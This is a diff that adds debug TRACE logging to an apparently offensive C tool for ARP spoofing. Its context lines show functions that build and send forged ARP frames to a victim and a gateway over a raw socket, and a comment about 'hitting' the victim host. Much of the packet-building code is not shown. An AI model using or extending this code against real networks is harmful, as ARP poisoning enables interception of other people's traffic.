@@ -44,6 +44,8 @@ char g_strGateWayIP[IP4_LEN_STR_MAX_PLUS_NEW_LINE - 1];
 char g_strGateWayMAC[MAC_LEN_STR_MAX];
 char g_str_eth[16];
 
+#define TRACE(Arg...)	printf( Arg );printf( "\n" );
+
 void LogMsg(char* pMsg)
 {
 	char timestr[128];
@@ -57,6 +59,7 @@ void LogMsg(char* pMsg)
 
 void ReadIPsFromFile()
 {
+	TRACE("Entered %s", __PRETTY_FUNCTION__);
 	FILE *pFileIPs = fopen(STR_FILE_NAME, "r");
 	if (pFileIPs == NULL)
 	{
@@ -78,6 +81,7 @@ void ReadIPsFromFile()
 		ui_IPsMacsCountRead++;
 	}
 	fclose(pFileIPs);
+	TRACE("Leave %s", __PRETTY_FUNCTION__);
 }
 
 typedef struct _arp_hdr arp_hdr;
@@ -96,6 +100,7 @@ struct _arp_hdr
 
 void Create_and_Send_ARP_RequestFrame(const char* strIP_target)
 {
+	TRACE("Entered %s", __PRETTY_FUNCTION__);
 #define ETH_HDRLEN 14      // Ethernet header length
 #define IP4_HDRLEN 20      // IPv4 header length
 #define ARP_HDRLEN 28      // ARP header length
@@ -160,10 +165,12 @@ void Create_and_Send_ARP_RequestFrame(const char* strIP_target)
 		perror("sendto() failed");
 		exit(EXIT_FAILURE);
 	}
+	TRACE("Leave %s", __PRETTY_FUNCTION__);
 }
 
 void CreateSockets()
 {
+	TRACE("Entered %s", __PRETTY_FUNCTION__);
 	if ((g_Raw_Socket = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0)
 	{
 		perror("socket() failed ");
@@ -182,10 +189,12 @@ void CreateSockets()
 	g_sin.sin_port = htons(67);
 	if ((g_udp_sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) < 0)
 		exit(EXIT_FAILURE);
+	TRACE("Leave %s", __PRETTY_FUNCTION__);
 }
 
 void GetMAC_ofEth(const char* ifName, unsigned char* pMAC_Bin)
 {
+	TRACE("Entered %s", __PRETTY_FUNCTION__);
 	ifreq ifr;
 	int sd;
 	// Submit request for a socket descriptor to look up interface.
@@ -217,10 +226,13 @@ void GetMAC_ofEth(const char* ifName, unsigned char* pMAC_Bin)
 			"Using net interface: %s, IP=%s, MAC=%02X:%02X:%02X:%02X:%02X:%02X\n",
 			ifName, inet_ntoa(*(in_addr*) &ip_of_eth), pMAC_Bin[0], pMAC_Bin[1],
 			pMAC_Bin[2], pMAC_Bin[3], pMAC_Bin[4], pMAC_Bin[5]);
+
+	TRACE("Leave %s", __PRETTY_FUNCTION__);
 }
 
 void DoARP_Spoof_Host(_IPsMacs* pArpEntry)
 {
+	TRACE("Entered %s", __PRETTY_FUNCTION__);
 	//printf("dolbim %s, kotoryj na %s\n", pArpEntry->ip, pArpEntry->mac);
 
 	if (sendto(g_Raw_Socket, pArpEntry->arp_frame_2victim, 42, 0,
@@ -235,10 +247,12 @@ void DoARP_Spoof_Host(_IPsMacs* pArpEntry)
 		perror("sendto() failed");
 		exit(EXIT_FAILURE);
 	}
+	TRACE("Leave %s", __PRETTY_FUNCTION__);
 }
 
 void CreatePacketToGateway(_IPsMacs* pArpEntry)
 {
+	TRACE("Entered %s", __PRETTY_FUNCTION__);
 	unsigned char binGateWayMAC[6];
 	if (6
 			!= sscanf((const char *) g_strGateWayMAC, "%2x:%2x:%2x:%2x:%2x:%2x",
@@ -277,10 +291,12 @@ void CreatePacketToGateway(_IPsMacs* pArpEntry)
 		fprintf(stderr, "inet_pton() failed");
 		exit(EXIT_FAILURE);
 	}
+	TRACE("Leave %s", __PRETTY_FUNCTION__);
 }
 
 void CreatePacketToVictim(_IPsMacs* pArpEntry)
 {
+	TRACE("Entered %s", __PRETTY_FUNCTION__);
 	if (6
 			!= sscanf((const char *) pArpEntry->mac, "%2x:%2x:%2x:%2x:%2x:%2x",
 					(unsigned int*) &pArpEntry->mac_bin[0],
@@ -318,10 +334,12 @@ void CreatePacketToVictim(_IPsMacs* pArpEntry)
 		fprintf(stderr, "inet_pton() failed");
 		exit(EXIT_FAILURE);
 	}
+	TRACE("Leave %s", __PRETTY_FUNCTION__);
 }
 
 void DoARP_Spoof()
 {
+	TRACE("Entered %s", __PRETTY_FUNCTION__);
 	char log_buf[200];
 	FILE* fp_proc_net_arp;
 	if ((fp_proc_net_arp = fopen("/proc/net/arp", "r")))
@@ -402,16 +420,20 @@ void DoARP_Spoof()
 			}//for (unsigned i = 0; i < ui_IPsMacsCountRead; i++)
 		}//while (fgets(strLine, sizeof(strLine), fp_proc_net_arp))
 	}//if ((fp_proc_net_arp = fopen("/proc/net/arp", "r")))
+	TRACE("Leave %s", __PRETTY_FUNCTION__);
 }
 
 void SendARP_Requests()
 {
+	TRACE("Entered %s", __PRETTY_FUNCTION__);
 	for (unsigned i = 0; i < ui_IPsMacsCountRead; i++)
 		Create_and_Send_ARP_RequestFrame(IPsMacs[i].ip);
+	TRACE("Leave %s", __PRETTY_FUNCTION__);
 }
 
 void ParseCmdLineParameters(int argc, char **argv)
 {
+	TRACE("Entered %s", __PRETTY_FUNCTION__);
 	if (argc != 7)
 	{
 		fprintf(stderr, "Usage: %s -i eth0 -g 192.168.0.1 -m 10:FE:11:11:11:11",
@@ -454,6 +476,7 @@ void ParseCmdLineParameters(int argc, char **argv)
 			break;
 		}
 	}
+	TRACE("Leave %s", __PRETTY_FUNCTION__);
 }
 
 int main(int argc, char* argv[])
